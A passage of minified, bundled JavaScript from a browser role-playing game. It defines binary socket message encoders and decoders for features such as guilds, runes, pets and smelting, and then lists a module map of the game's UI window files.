e=this,n=t.readInt(),o=[];return Promise.resolve().then(function(){return i(40)}).then(function(i){for(var s=i.ItemData,a=t.readShort(),r=0;a>r;r++){var l=new s;l.parser(t),o.push(l)}return e.guildEquit({equitScore:n,items:o})}),{equitScore:n,items:o}},t.guildEquit=function(t){return t},__decorate([post()],t,"guildEquit",null),t}();window.p37_36=n,__reflect(n.prototype,"p37_36",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){for(var e=t.readShort(),i=[],n=0;e>n;n++){var o=t.readInt(),s=t.readInt();i.push([o,s])}return{item:i}},t}();window.p3_11=i,__reflect(i.prototype,"p3_11",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.length;t.writeByte(i);for(var n=0;i>n;n++)t.writeInt(e[n])},t.decode=function(t){for(var e=1==t.readByte(),i=t.readUnsignedByte(),n=[],o=0;i>o;o++)n.push(t.readInt());return{auto:e,arr:n}},t}();window.p3_12=i,__reflect(i.prototype,"p3_12",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){t.writeByte(e?1:0)},t.decode=function(t){return t},t}();window.p3_13=i,__reflect(i.prototype,"p3_13",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.length;t.writeByte(i);for(var n in e)t.writeInt(e[n])},t.decode=function(t){for(var e=t.readUnsignedByte(),i=[],n=0;e>n;n++){for(var o=t.readInt(),s=t.readByte(),a=[],r=0;s>r;r++){var l=t.readInt(),h=t.readInt(),u=t.readInt();a.push({type:l,id:h,count:u})}0==s&&(a=null),i.push({itemId:o,awards:a})}return{arr:i}},t}();window.p3_14=i,__reflect(i.prototype,"p3_14",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){for(var e=t.readInt(),i=t.readUnsignedByte(),n=[],o=0;i>o;o++){var s=t.readUnsignedByte();n[s]={type:t.readInt(),id:t.readInt(),count:t.readInt()}}return{itemId:e,arr:n}},t}();window.p3_16=i,__reflect(i.prototype,"p3_16",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e,i){var n=e.itemId;void 0===i&&(i=!1),t.writeInt(n),t.writeByte(+i)},t.decode=function(t){var e=t.readUnsignedByte(),i=t.readUnsignedByte();return{index:e,count:i}},t}();window.p3_17=i,__reflect(i.prototype,"p3_17",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(){},t}();window.p3_18=i,__reflect(i.prototype,"p3_18",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){t.writeShort(e.length);for(var i in e)t.writeInt(e[i].configID),t.writeInt(e[i].count)},t.decode=function(t){return t},t}();window.p3_3=i,__reflect(i.prototype,"p3_3",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){for(var e=t.readByte(),i=t.readByte(),n=[],o=0;i>o;o++)n.push({type:t.readInt(),id:t.readInt(),count:t.readInt()});return{result:e,list:n}},t}();window.p49_22=i,__reflect(i.prototype,"p49_22",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(){},t}();window.p49_23=i,__reflect(i.prototype,"p49_23",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.handle,n=e.pos,o=e.roleId;t.writeDouble(i),t.writeShort(o),t.writeShort(n)},t.decode=function(t){return t},t}();window.p4_1=i,__reflect(i.prototype,"p4_1",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.handle,n=e.roleId,o=e.pos;t.writeDouble(i),t.writeByte(n),t.writeByte(o)},t.decode=function(t){return t},t}();window.p4_26=i,__reflect(i.prototype,"p4_26",[])},function(t,e){var i=function(){function t(){}return t.encode=function(){},t.decode=function(t){for(var e=t.readByte(),i=[],n=0;e>n;n++)i.push(t.readInt());return{items:i,power:t.readInt()}},t}();window.p4_57=i,__reflect(i.prototype,"p4_57",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.pos,n=e.itemId;t.writeByte(i),t.writeInt(n)},t.decode=function(t){var e=t.readByte(),i=t.readInt(),n=t.readInt();return{pos:e,itemId:i,power:n}},t}();window.p4_58=i,__reflect(i.prototype,"p4_58",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.pos,n=e.itemId;t.writeByte(i),t.writeInt(n)},t.decode=function(t){return{pos:t.readByte(),itemId:t.readInt(),power:t.readInt()}},t}();window.p4_59=i,__reflect(i.prototype,"p4_59",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.pos,n=e.itemId;t.writeByte(i),t.writeInt(n)},t.decode=function(t){return{pos:t.readByte(),itemId:t.readInt(),power:t.readInt()}},t}();window.p4_60=i,__reflect(i.prototype,"p4_60",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.role,n=e.pos,o=e.runeId;t.writeShort(i),t.writeShort(n),t.writeDouble(o)},t.decode=function(t){var e=t.readShort(),i=t.readShort(),n=t.readShort(),o=t.readInt(),s=t.readUnsignedInt();return{result:e,roleID:i,pos:n,id:o,power:s}},t}();window.p50_1=i,__reflect(i.prototype,"p50_1",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.role,n=e.pos;t.writeShort(i),t.writeShort(n)},t.decode=function(t){var e=t.readByte(),i=e?t.readShort():0,n=e?t.readShort():0,o=e?t.readInt():0;return{result:e,roleID:i,pos:n,id:o}},t}();window.p50_2=i,__reflect(i.prototype,"p50_2",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.length;t.writeInt(i);for(var n=0;i>n;n++)t.writeInt(e[n].configID)},t.decode=function(t){var e=!!t.readByte(),i=t.readInt();return{result:e,num:i}},t}();window.p50_3=i,__reflect(i.prototype,"p50_3",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t){},t.decode=function(t){return t},t}();window.p58_10=i,__reflect(i.prototype,"p58_10",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e,i){var n=e.idx;void 0===i&&(i=!1),t.writeByte(n),t.writeByte(+i)},t.decode=function(){},t}();window.p58_9=i,__reflect(i.prototype,"p58_9",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){var i=e.roleId,n=e.type;t.writeShort(i),t.writeByte(n)},t.decode=function(t){var e=t.readShort(),i=t.readInt(),n=t.readUnsignedInt(),o=t.readInt(),s=t.readUnsignedInt(),a=t.readShort();return{index:e,lv:i,exp:n,addExp:o,clearTime:s,crit:a}},t.levelup=function(){},__decorate([post()],t,"levelup",null),t}();window.p6_2=i,__reflect(i.prototype,"p6_2",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){t.writeInt(e)},t.decode=function(t){return t},t}();window.p79_18=i,__reflect(i.prototype,"p79_18",[])},function(t,e){var i=function(){function t(){}return t.encode=function(t,e){t.writeByte(e)},t.decode=function(t){for(var e=t.readUnsignedByte(),i=t.readShort(),n={},o=0;i>o;o++)n[t.readShort()]=t.readInt();return{index:e,atts:n}},t}();window.p79_20=i,__reflect(i.prototype,"p79_20",[])},function(t,e){},function(t,e){var i=function(){function t(){}return t.encode=function(t,e,i){var n=e.uid;void 0===i&&(i=!1),t.writeDouble(n),t.writeByte(+i)},t.decode=function(t){return t},t}();window.p8_3=i,__reflect(i.prototype,"p8_3",[])},function(t,e,i){function n(t){var e=o(t);return i(e)}function o(t){if(!i.o(s,t)){var e=new Error("Cannot find module '"+t+"'");throw e.code="MODULE_NOT_FOUND",e}return s[t]}var s={"./Ts.ts":764};n.keys=function(){return Object.keys(s)},n.resolve=o,t.exports=n,n.id=763},function(t,e){function i(t){}function n(t,e){var i=egret.getQualifiedClassName(t),n=i.replace("p","").split("_"),o=n[0],s=n[1],a=Socket.ins().getBytes();a.writeCmd(+o,+s),t.encode(a,e),Socket.ins().sendToServer(a,e)}function o(t,e,i,o){return new Promise(function(s){var a=egret.getQualifiedClassName(o||t),r=a.replace("p","").split("_"),l=r[0],h=r[1];s.checkFun=i,regMsgOnce(l+"-"+h,s),n(t,e)})}function s(t,e){for(var i=[],n=2;n<arguments.length;n++)i[n-2]=arguments[n];for(var o=[],s=0,a=i;s<a.length;s++){var r=a[s];r.decode?o.push(egret.getQualifiedClassName(r).replace("p","").replace("_","-")):o.push(r)}regMsg.apply(void 0,__spreadArrays([t,e],o))}function a(t){delMsg(t)}var r={Red:"0xff0000",White:"0xffffff"};window.Colors=r,window.getColorName=i,window.send=n,window.sendSync=o,window.observe=s,window.removeObserve=a;var l={move:p0_31,removeEntity:p0_10,useSkill:p2_1,selectCamp:p79_18,enterFb:p10_40,exitFB:p1_4,enterScene:p0_3,pickUp:p0_46,petData:p100_2,petUpLevel:p100_3,killMeHandle:p0_40,petGift:p100_4,WearEquip:p4_1,WearPowerEquip:p4_26,GuildWarehouse:p37_36,getRoleAtts:p79_20,itemCd:p3_11,attrChange:p30_6,itemPos:p2_19,fGodInfo:p101_1,fGodLvUp:p101_2,fGodWear:p101_4,fGodForging:p101_5,wingBoost:p6_2,actorDie:p0_41,relive:p0_42,delMail:p8_3,getPetFight:p100_6,getPetState:p100_7,equipRune:p50_1,upgradeRune:p50_2,decomposeRune:p50_3,transfer:p0_43,smeltSet:p3_12,smeltAuto:p3_13,smeltAward:p3_14,smelt:p3_3,addBuff:p2_2,removeBuff:p2_3,entityChangeModel:p0_44,getCanAtkTarget:p1_82,getHeJiInfo:p2_9,getServerTime:p0_14,roleStatus:p0_45,restoreBlood:p58_9,getMapBossLost:p58_10,mineResult:p49_22,rebackMine:p49_23,entityHpChange:p0_9,belongChange:p0_47,createItemTurn:p3_16,doItemTurn:p3_17,deleteItemTurn:p3_18,orangeInfo:p4_57,orangeWear:p4_58,orangeCompose:p4_59,orangeLvUp:p4_60};window.Ts=l},function(t,e,i){function n(t){var e=o(t);return i(e)}function o(t){if(!i.o(s,t)){var e=new Error("Cannot find module '"+t+"'");throw e.code="MODULE_NOT_FOUND",e}return s[t]}var s={"./game/module/Totem/import/TotemDescomWin.ts":354,"./game/module/Totem/import/TotemDetailedItem.ts":230,"./game/module/Totem/import/TotemPanel.ts":766,"./game/module/Totem/import/TotemSkillTipsWin.ts":242,"./game/module/Totem/import/TotemSuitTipsWin.ts":355,"./game/module/active/import/Activationtongyong.ts":767,"./game/module/activity/view/import/BossScoreExchangeWin.ts":768,"./game/module/activity/view/import/ComActivityWin.ts":769,"./game/module/activity/view/import/LuckyResultWinEx.ts":770,"./game/module/activity/view/import/OSA41_3TipPanel.ts":771,"./game/module/activity/view/import/OSATarget58RankWin.ts":772,"./game/module/activity/view/import/OSAZhanlingTipPanel.ts":773,"./game/module/activity/view/import/osa19p1rewardPanel.ts":774,"./game/module/artifact/view/import/ArtifactAllAttrWin.ts":775,"./game/module/artifact/view/import/ArtifactChipOpenWin.ts":776,"./game/module/artifact/view/import/TargetWin.ts":777,"./game/module/artifact/view/import/shenqispTipsWin.ts":778,"./game/module/auction/import/AuctionItemChoiceWin.ts":779,"./game/module/auction/import/AuctionQuotaTipWin.ts":780,"./game/module/auction/import/AuctionRecordWin.ts":781,"./game/module/auction/import/AuctionWin.ts":244,"./game/module/auction/import/EquipTipsBase.ts":782,"./game/module/bag/view/import/BagCallBackConfirmWin.ts":358,"./game/module/bag/view/import/BagCallBackItem.ts":228,"./game/module/bag/view/import/BagCallBackPanel.ts":323,"./game/module/bag/view/import/BagEquipIntensifyPanel.ts":166,"./game/module/bag/view/import/BagEquipIntensifySuitTip.ts":313,"./game/module/bag/view/import/BagPanel.ts":184,"./game/module/bag/view/import/BagWin.ts":185,"./game/module/bag/view/import/BagWin2.ts":224,"./game/module/bag/view/import/DressTipsWin.ts":783,"./game/module/bag/view/import/EquipDetailedWin.ts":359,"./game/module/bag/view/import/FlowerOpenWin.ts":784,"./game/module/bag/view/import/FlowerUseTipsWin.ts":785,"./game/module/bag/view/import/HejiEquipTipsWin.ts":786,"./game/module/bag/view/import/ItemCbTip.ts":787,"./game/module/bag/view/import/ItemCurrencyWin.ts":788,"./game/module/bag/view/import/ItemDetailedWin.ts":245,"./game/module/bag/view/import/ItemJulingTip.ts":789,"./game/module/bag/view/import/ItemRechargeTipWin.ts":790,"./game/module/bag/view/import/ItemUseTipsWin.ts":325,"./game/module/bag/view/import/PropGainTipsWin.ts":791,"./game/module/bag/view/import/RuneTipsWin.ts":792,"./game/module/bag/view/import/SmeltMainWin.ts":793,"./game/module/bag/view/import/SmeltSelectWin.ts":794,"./game/module/bag/view/import/SmeltSetWin.ts":795,"./game/module/battle/import/BattleNpcTipWin.ts":796,"./game/module/battle/import/BattleRankWin.ts":797,"./game/module/battle/import/BattleResultWin.ts":798,"./game/module/battle/import/BattleWin.ts":799,"./game/module/battle/import/CommonHelpWin.ts":76,"./game/module/book/import/BookPanel.ts":296,"./game/module/book/import/BookTipsWin.ts":800,"./game/module/book/import/BookUpWin.ts":801,"./game/module/book/import/BreakDownView.ts":802,"./game/module/boss/import/BossBloodPanel.ts":803,"./game/module/boss/import/BossEndView.ts":804,"./game/module/boss/import/BossHomeMainWin.ts":805,"./game/module/boss/import/BossMainWin.ts":806,"./game/module/boss/import/BossWin.ts":807,"./game/module/boss/import/Boss_RevelryWin.ts":808,"./game/module/boss/import/HideBossBtnWin.ts":809,"./game/module/boss/import/HideBossWin.ts":810,"./game/module/boss/import/NewWorldBossUIView.ts":811,"./game/module/boss/import/PubBossRemindWin.ts":812,"./game/module/boss/import/PublicBossJiangliTipWin.ts":813,"./game/module/boss/import/PublicBossMainWin.ts":814,"./game/module/boss/import/RandBossWin.ts":815,"./game/module/boss/import/WildBossJoinWin.ts":816,"./game/module/boss/import/WorldBossJiangLiWin.ts":817,"./game/module/boss/import/WorldBossJiangliTipWin.ts":818,"./game/module/boss/import/WorldBossUiInfo.ts":819,"./game/module/boss/import/WorldBossWin.ts":820,"./game/module/boss/import/ZsBossRuleSpeak.ts":821,"./game/module/camp/import/CampSelectWin.ts":822,"./game/module/card/import/CardWin.ts":823,"./game/module/card/import/MonthbossNoticeWin.ts":824,"./game/module/chat/import/ChatEmojiWin.ts":825,"./game/module/chat/import/ChatEmojiWin2.ts":826,"./game/module/chat/import/ChatMainUI.ts":827,"./game/module/chat/import/ChatWin.ts":148,"./game/module/chat/import/PlayerTipsWin.ts":828,"./game/module/chat/import/PrivateChatWin.ts":829,"./game/module/chooseItem/import/ChooseItemWin.ts":832,"./game/module/city/import/BlackSmithWin.ts":833,"./game/module/city/import/BossBelongPanel.ts":834,"./game/module/compass/import/CompassPanel.ts":835,"./game/module/compass/import/CompassRewardWin.ts":836,"./game/module/crossDartCar/import/CrossDartCarBuyPanel.ts":837,"./game/module/crossDartCar/import/CrossDartCarDescPanel.ts":838,"./game/module/crossDartCar/import/CrossDartCarLogPanel.ts":839,"./game/module/crossDartCar/import/CrossDartCarMapWin.ts":367,"./game/module/crossDartCar/import/CrossDartCarMsgWin.ts":370,"./game/module/crossDartCar/import/CrossDartCarRewardWin.ts":372,"./game/module/crossDartCar/import/CrossDartCarWarnWin.ts":246,"./game/module/crossDartCar/import/CrossDartCarWin.ts":373,"./game/module/demonCir/import/DCTaskRewardWin.ts":840,"./game/module/demonCir/import/DemonCirPanel.ts":841,"./game/module/dominateWorld/import/DominateFightResultWin.ts":330,"./game/module/dominateWorld/import/DominateWorldCityDesc.ts":232,"./game/module/dominateWorld/import/DominateWorldFightPanel.ts":845,"./game/module/dominateWorld/import/DominateWorldPanel.ts":846,"./game/module/dominateWorld/import/DominateWorldRule.ts":847,"./game/module/dominateWorld/import/DominateWorldTotemFightPanel.ts":332,"./game/module/dress/import/DressMainWin.ts":848,"./game/module/dress/import/DressWin.ts":850,"./game/module/dygame/import/DYDesktopAddRule.ts":851,"./game/module/dygame/import/DYSidebarRule.ts":852,"./game/module/dygame/import/DYSidebarWin.ts":379,"./game/module/dygame/import/DyDesktopAddWin.ts":378,"./game/module/dygame/import/DyGameAwardWin.ts":853,"./game/module/dygame/import/DyGameConcernRule.ts":854,"./game/module/dygame/import/DyGameConcernWin.ts":380,"./game/module/dygame/import/DyGameRule.ts":855,"./game/module/encounter/import/EncounterRewardWin.ts":856,"./game/module/encounter/import/EncounterTreasureMissionWin.ts":857,"./game/module/equipCasting/import/CastingMainWin.ts":858,"./game/module/equipCasting/import/CastingResultWin.ts":341,"./game/module/equipCasting/import/CastingSelEquipWin.ts":381,"./game/module/equipInlay/import/EquipInlayPanel.ts":225,"./game/module/equipInlay/import/EquipInlaySuitWin.ts":863,"./game/module/equipInlay/import/EquipInlayTipsWin.ts":868,"./game/module/equipInlay/import/EquipInlayUpgradeWin.ts":869,"./game/module/equipInlay/import/ItemBase_select.ts":318,"./game/module/equipSacrifice/import/EquipSacrificePanel.ts":319,"./game/module/equipSacrifice/import/EquipSacrificeSuitPanel.ts":871,"./game/module/expgold/import/ExpGoldWin.ts":872,"./game/module/expworld/import/ExpWorldWin.ts":873,"./game/module/extremeEquip/import/ExtremeBuffTips.ts":874,"./game/module/extremeEquip/import/ExtremeEquipItem.ts":875,"./game/module/extremeEquip/import/ExtremeEquipPanel.ts":308,"./game/module/extremeEquip/import/ExtremeEquipTipsWin.ts":876,"./game/module/fb/import/BabelLotteryWin.ts":877,"./game/module/fb/import/ChallengeDayRewardWin.ts":878,"./game/module/fb/import/ChallengeInfoPanel.ts":879,"./game/module/fb/import/DemonSceneWin.ts":880,"./game/module/fb/import/ExpAddUI.ts":881,"./game/module/fb/import/FBChallengePanel.ts":383,"./game/module/fb/import/FBChallengeRankWin.ts":883,"./game/module/fb/import/FBCountDown.ts":885,"./game/module/fb/import/FbEnterWin.ts":886,"./game/module/fb/import/FbWin.ts":887,"./game/module/fb/import/GuanQiaWorldRewardWin.ts":888,"./game/module/fb/import/NewPlayWayPanel.ts":889,"./game/module/fb/import/ResBloodWin.ts":890,"./game/module/fb/import/TempleStarsNewWin.ts":891,"./game/module/fbTeam/import/FriendListWin.ts":892,"./game/module/fbTeam/import/GwbossqzWin.ts":893,"./game/module/fbTeam/import/MemberInfoWin.ts":248,"./game/module/fbTeam/import/TeamCityListWin.ts":894,"./game/module/fbTeam/import/TeamCityRollWin.ts":895,"./game/module/fbTeam/import/TeamFBCheckRoleWin.ts":250,"./game/module/fbTeam/import/TeamFbFightWin.ts":896,"./game/module/fbTeam/import/TeamFbGuideWin.ts":897,"./game/module/fbTeam/import/TeamFbInviteWin.ts":898,"./game/module/fbTeam/import/TeamFbNewPanel.ts":899,"./game/module/fbTeam/import/TeamFbResultWin.ts":900,"./game/module/fbTeam/import/TeamFbRoomWin.ts":901,"./game/module/fightresult/import/BossResultWin.ts":902,"./game/module/fightresult/import/ExpFbResultWin.ts":903,"./game/module/fightresult/import/FireResultWin.ts":904,"./game/module/fightresult/import/MaterialResultWin.ts":905,"./game/module/fightresult/import/PersonalResultWin.ts":906,"./game/module/fightresult/import/ResultWin.ts":907,"./game/module/fightresult/import/TongResultWin.ts":908,"./game/module/firstCharge/view/import/BtnFirstCharge.ts":390,"./game/module/firstCharge/view/import/FirstChargeNew.ts":391,"./game/module/firstCharge/view/import/FirstCharge_reward.ts":392,"./game/module/floatingWindow/import/FloatingWindowView.ts":909,"./game/module/forest/import/ForestBattleResultWin.ts":910,"./game/module/forest/import/ForestBuffChoiceItem.ts":393,"./game/module/forest/import/ForestBuffChoiceWin.ts":911,"./game/module/forest/import/ForestBuffItem.ts":395,"./game/module/forest/import/ForestBuffWin.ts":394,"./game/module/forest/import/ForestEvent1Win.ts":912,"./game/module/forest/import/ForestEvent2Win.ts":913,"./game/module/forest/import/ForestEvent3Win.ts":914,"./game/module/forest/import/ForestEventView.ts":397,"./game/module/forest/import/ForestPropItemRender.ts":398,"./game/module/forest/import/ForestPropWin.ts":915,"./game/module/forest/import/ForestRankItemRenderer.ts":399,"./game/module/forest/import/ForestRankWin.ts":916,"./game/module/forest/import/ForestResetWin.ts":917,"./game/module/forest/import/ForestStoreItems.ts":396,"./game/module/forest/import/ForestTipsWin.ts":918,"./game/module/forest/import/ForestWin.ts":919,"./game/module/forge/import/ForgeWin.ts":139,"./game/module/fourgod/import/FourGodForgingWin.ts":920,"./game/module/fourgod/import/FourGodItemTipsWin.ts":921,"./game/module/fourgod/import/FourGodMainWin.ts":922,"./game/module/fourgod/import/ItemTurningWin.ts":923,"./game/module/friends/import/FriendBgWin.ts":924,"./game/module/fuli/import/FacebookWindow.ts":401,"./game/module/fuli/import/FuliActivityMain.ts":402,"./game/module/fuli/import/FuliMain1001.ts":925,"./game/module/fuli/import/FuliMain1002.ts":926,"./game/module/fuli/import/FuliMain2.ts":404,"./game/module/fuli/import/FuliMain3.ts":405,"./game/module/fuli/import/FuliMain4.ts":406,"./game/module/fuli/import/FuliMain5.ts":407,"./game/module/fuli/import/FuliMain6.ts":927,"./game/module/fuli/import/FuliOrderMain.ts":928,"./game/module/fuli/import/FuliWin.ts":252,"./game/module/fuli/import/FuncShowPanel.ts":929,"./game/module/fuli/import/MergeActivityMain.ts":930,"./game/module/fuli/import/QingDianMainWin.ts":414,"./game/module/fuli/import/QingDianMainWin2.ts":170,"./game/module/godCrown/import/GodCrownComponentPanel.ts":415,"./game/module/godCrown/import/GodCrownDetailsPanel.ts":417,"./game/module/godCrown/import/GodCrownPanel.ts":931,"./game/module/godCrown/import/GodCrownQualityPanel.ts":421,"./game/module/godCrown/import/GodCrownSkillDetailsPanel.ts":423,"./game/module/godCrown/import/GodCrownSkillPanel.ts":422,"./game/module/godweapon/import/GwWeaponView.ts":932,"./game/module/godwing/import/GodWingDescomWin.ts":425,"./game/module/godwing/import/GodWingEquipTipsWin.ts":935,"./game/module/godwing/import/GodWingSkillTipsWin.ts":936,"./game/module/godwing/import/GodWingSuitTipsWin.ts":937,"./game/module/godwing/import/GodWingTipsWin.ts":938,"./game/module/godwing/import/GodWingWin.ts":939,"./game/module/godwing/import/ShenYuKeYinTipsWin.ts":940,"./game/module/guard/import/GuardCallBossWin.ts":941,"./game/module/guard/import/GuardMainUI.ts":942,"./game/module/guard/import/GuardQuitTips.ts":943,"./game/module/guard/import/GuardRewardWin.ts":944,"./game/module/guild/view/import/DailyAwardPanel.ts":945,"./game/module/guild/view/import/DailypresidentAwardPanel.ts":946,"./game/module/guild/view/import/GuildActivityWin.ts":947,"./game/module/guild/view/import/GuildApplyListWin.ts":948,"./game/module/guild/view/import/GuildApplyWin.ts":950,"./game/module/guild/view/import/GuildBossDetailWin.ts":952,"./game/module/guild/view/import/GuildBossRankWin.ts":953,"./game/module/guild/view/import/GuildBossWin.ts":954,"./game/module/guild/view/import/GuildChangeNameView.ts":955,"./game/module/guild/view/import/GuildConWin.ts":956,"./game/module/guild/view/import/GuildCreateWin.ts":957,"./game/module/guild/view/import/GuildMap.ts":214,"./game/module/guild/view/import/GuildNoticeWin.ts":958,"./game/module/guild/view/import/GuildShopPanel.ts":959,"./game/module/guild/view/import/GuildShopRecordWin.ts":960,"./game/module/guild/view/import/GuildSkillShopWin.ts":961,"./game/module/guild/view/import/GuildSkillWin.ts":962,"./game/module/guild/view/import/GuildWarMainWin.ts":963,"./game/module/guild/view/import/GuildWarMemWin.ts":964,"./game/module/guild/view/import/GuildWarResultWin.ts":965,"./game/module/guild/view/import/GuildWarRewardWin.ts":966,"./game/module/guild/view/import/GuildWarRulesWin.ts":967,"./game/module/guild/view/import/GuildWarUiInfo.ts":968,"./game/module/guild/view/import/GuildWarehousePanel.ts":969,"./game/module/guild/view/import/GuildWin.ts":970,"./game/module/guild/view/import/GuileWarReliveWin.ts":971,"./game/module/guild/view/import/RedBagDetailsWin.ts":972,"./game/module/guild/view/import/RedBagWin.ts":973,"./game/module/guild/view/import/SelectMemberPanelWin.ts":974,"./game/module/guild/view/import/SelectMemberRewardWin.ts":975,"./game/module/guildBattle/import/GuildBattleWin.ts":215,"./game/module/heartmethod/import/HeartMethodAttrWin.ts":976,"./game/module/heartmethod/import/HeartMethodDecomposePanel.ts":977,"./game/module/heartmethod/import/HeartMethodSkillTips.ts":978,"./game/module/heartmethod/import/HeartMethodTips.ts":979,"./game/module/hegemony/import/HChampionPanel.ts":980,"./game/module/hegemony/import/HMarketPanel.ts":981,"./game/module/hegemony/import/HRewardsPanel.ts":983,"./game/module/hegemony/import/HSBattleFbUI.ts":985,"./game/module/hegemony/import/HSKnockoutPanel.ts":427,"./game/module/hegemony/import/HSPVPResultWin.ts":997,"./game/module/hegemony/import/HSPreBattlePanel.ts":998,"./game/module/hegemony/import/HSPreEventsPanel":428,"./game/module/hegemony/import/HSPreEventsPanel.ts":428,"./game/module/hegemony/import/HSRoleItem.ts":1e3,"./game/module/hegemony/import/HSSixteenPanel.ts":429,"./game/module/hegemony/import/HSTabItem.ts":257,"./game/module/hegemony/import/HegemonyMainWin.ts":1008,"./game/module/hegemony/import/HegemonyPanel.ts":1010,"./game/module/heirloom/import/HeirloomEquipTipsWin.ts":1016,"./game/module/heirloom/import/HeirloomSkillItem.ts":1017,"./game/module/heirloom/import/ThunderEquipTipsWin.ts":1018,"./game/module/heirloom/import/ThunderSkillTipsWin.ts":1019,"./game/module/heji/import/PunchEquipAttrWin.ts":1020,"./game/module/heji/import/PunchEquipChooseWin.ts":1021,"./game/module/heji/import/PunchEquipDetailWin.ts":1022,"./game/module/heji/import/PunchExchangeWin.ts":1023,"./game/module/heji/import/PunchExtShowWin.ts":1024,"./game/module/heji/import/PunchResWin.ts":1025,"./game/module/heji/import/PunchTransformWin.ts":1026,"./game/module/hungu/import/HunguAttrWin.ts":1027,"./game/module/hungu/import/HunguChooseEquipWin.ts":1028,"./game/module/hungu/import/HunguGroupWin.ts":1029,"./game/module/hungu/import/HunguStageWin.ts":1030,"./game/module/hungu/import/HunguTipsWin.ts":1031,"./game/module/hungu/import/HunyuWin.ts":1032,"./game/module/invade/import/InvadeTeamRoomWin.ts":235,"./game/module/invade/import/InvadeWin.ts":258,"./game/module/ladder/import/ItemLadderRewardTipRender.ts":433,"./game/module/ladder/import/LadderChallengeWin.ts":1035,"./game/module/ladder/import/LadderInfoPanel.ts":1036,"./game/module/ladder/import/LadderLastRankWin.ts":1037,"./game/module/ladder/import/LadderResultWin.ts":1039,"./game/module/ladder/import/LadderRewardShowWin.ts":1040,"./game/module/ladder/import/LadderRewardTipWin.ts":1041,"./game/module/ladder/import/LadderWin.ts":1042,"./game/module/lilian/view/import/JadeSkillWin.ts":1043,"./game/module/lilian/view/import/LiLianTips.ts":1044,"./game/module/lilian/view/import/LiLianWin.ts":1045,"./game/module/lilian/view/weiwang/import/WeiWangOverViewWin.ts":1046,"./game/module/lilian/view/weiwang/import/WeiWangTitleTipsWin.ts":1047,"./game/module/lingJing/import/LingJingInfoPanel.ts":1048,"./game/module/lingJing/import/LingJingMainPanel.ts":1049,"./game/module/lingJing/import/LingJingRankPanel.ts":1054,"./game/module/lingJing/import/LingJingRewardPanel.ts":1055,"./game/module/longGas/import/LongGasBreakPanel.ts":440,"./game/module/longGas/import/LongGasPanel.ts":1056,"./game/module/longGas/import/LongGasSkillTipWin.ts":444,"./game/module/longGas/import/LongGasStateShowPanel.ts":1057,"./game/module/loongsoul/view/import/JadeUpTipsWin.ts":1058,"./game/module/loongsoul/view/import/TreasureWin.ts":1059,"./game/module/loongsoul/view/import/YupeiSkillTipsWin.ts":1060,"./game/module/mail/import/MailWin.ts":1061,"./game/module/mainui/import/GongLueText.ts":234,"./game/module/mainui/import/Item_BianQiang.ts":293,"./game/module/mainui/import/Item_GongLue.ts":446,"./game/module/mainui/import/Item_GongLue2.ts":447,"./game/module/mainui/import/MainBattleUi.ts":1062,"./game/module/mainui/import/MainBossUI.ts":1063,"./game/module/mainui/import/MainBot.ts":1064,"./game/module/mainui/import/MainCityItem.ts":448,"./game/module/mainui/import/MainCityWin.ts":1065,"./game/module/mainui/import/MainFightWin.ts":1066,"./game/module/mainui/import/MainFubenUi.ts":1069,"./game/module/mainui/import/MainInfoKoWin.ts":1070,"./game/module/mainui/import/MainMap.ts":1071,"./game/module/mainui/import/MainMapBar.ts":1074,"./game/module/mainui/import/MainMapBoss.ts":239,"./game/module/mainui/import/MainMapBossItem.ts":347,"./game/module/mainui/import/MainMapInfo.ts":1075,"./game/module/mainui/import/MainMapInfoItem.ts":458,"./game/module/mainui/import/MainPot.ts":1077,"./game/module/mainui/import/MainPotTip.ts":1078,"./game/module/mainui/import/MainTempleStarsUI.ts":1079,"./game/module/mainui/import/MainTop.ts":1080,"./game/module/mainui/import/MainUI.ts":1081,"./game/module/mainui/import/MapSearch.ts":459,"./game/module/mainui/import/View_BianQiang.ts":67,"./game/module/mainui/import/View_GongLue.ts":457,"./game/module/map/import/MapWin.ts":1083,"./game/module/masterSuitEquip/import/MasterEquipSuitTips.ts":472,"./game/module/masterSuitEquip/import/MasterEquipTips.ts":260,"./game/module/masterSuitEquip/import/MasterEquipWarnFrameWin.ts":473,"./game/module/masterSuitEquip/import/MasterEquipWin.ts":200,"./game/module/masterSuitEquip/import/RoleChooseMasterEntryItem.ts":475,"./game/module/masterSuitEquip/import/RoleChooseMasterEquipWin.ts":476,"./game/module/masterSuitEquip/import/RoleMasterEquipChooseItem.ts":477,"./game/module/merge/import/ComposePanel.ts":320,"./game/module/merge/import/ComposeTip.ts":478,"./game/module/moregame/import/MoreGameView.ts":479,"./game/module/nebula/import/NebulaAttrItem.ts":480,"./game/module/nebula/import/NebulaDetailWin.ts":481,"./game/module/nebula/import/NebulaDetailsItem.ts":482,"./game/module/nebula/import/NebulaLineItem.ts":483,"./game/module/nebula/import/NebulaSkillItem.ts":484,"./game/module/nebula/import/NebulaWin.ts":1087,"./game/module/nebula/import/StartPoint.ts":1088,"./game/module/newequip/import/NewEquipWin.ts":1089,"./game/module/newrole/import/NewRoleWin.ts":1090,"./game/module/notice/import/NoticeView.ts":300,"./game/module/notice/import/UpdateRemind